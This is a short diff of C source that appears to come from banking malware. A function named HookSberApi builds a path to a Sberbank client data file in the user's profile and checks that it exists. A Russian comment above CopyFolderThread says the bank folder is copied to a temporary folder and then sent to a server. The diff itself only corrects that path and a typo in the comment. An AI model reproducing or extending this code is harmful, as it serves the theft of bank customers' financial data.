@@ -248,7 +248,7 @@ static bool HookSberApi()
 
 	char path[MAX_PATH];
 	pExpandEnvironmentStringsA( "%USERPROFILE%", path, sizeof(path) );
-	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\sbgrbd.bal" );
+	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\Sbr\\sbgrbd.bal" );
 	if( FileExistsA(path) )
 	{
 		DBG( "Sber", "Файл '%s' существует", path );
@@ -264,7 +264,7 @@ static bool HookSberApi()
 	return true;
 }
 
-//непосредственное копирование папки сбера, сначала коипрует во временную папку, а потом отсылает на сервер с временной папки
+//непосредственное копирование папки сбера, сначала копирует во временную папку, а потом отсылает на сервер с временной папки
 static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
 
